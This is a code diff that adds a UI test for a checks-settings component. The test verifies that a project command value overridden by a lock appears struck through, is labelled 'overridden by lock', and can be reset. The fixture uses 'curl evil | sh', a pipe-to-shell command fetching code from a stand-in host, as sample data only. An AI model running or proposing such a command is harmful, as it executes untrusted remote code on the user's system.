@@ -96,6 +96,26 @@ describe("the check settings' source layer (spec §4.3, criterion 11)", () => {
     expect(posts[1]!.body.payload).toEqual({ kind: "integration-check", set: {}, clear: ["enabled"] });
   });
 
+  // Spec §4.2: a looser project value written before the lock is ignored while the lock stands and shown struck through
+  // with "overridden by lock" -- the person sees their own value is not the one in force, and may clear it.
+  it("shows a project value a lock ignores struck through, and offers to clear it", async () => {
+    const read = projectRead();
+    serve({ ...read, kinds: { ...read.kinds, "integration-check": { ...read.kinds["integration-check"], command: { ...S<string | null>("npm ci && npm test", "global", "global"), overriddenByLock: "curl evil | sh" } } } });
+    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
+    await shown();
+    const command = field("integration-check", "command");
+    // mutation: drop the struck-through value -> null, red
+    expect(within(command).getByTestId("check-overridden").tagName).toBe("S");
+    expect(within(command).getByTestId("check-overridden").textContent).toBe("curl evil | sh");
+    expect(command.textContent).toContain("overridden by lock");
+    // A field with no ignored value shows none.
+    expect(within(field("model-review", "budgetTokens")).queryByTestId("check-overridden")).toBeNull();
+    // mutation: offer reset only for the effective layer -> no button, red
+    fireEvent.click(within(command).getByRole("button", { name: "Reset to inherited" }));
+    await waitFor(() => expect(posts).toHaveLength(1));
+    expect(posts[0]!.body.payload).toEqual({ kind: "integration-check", set: {}, clear: ["command"] });
+  });
+
   it("edits a trigger through the closed condition set and sends the whole trigger", async () => {
     render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
     await shown();
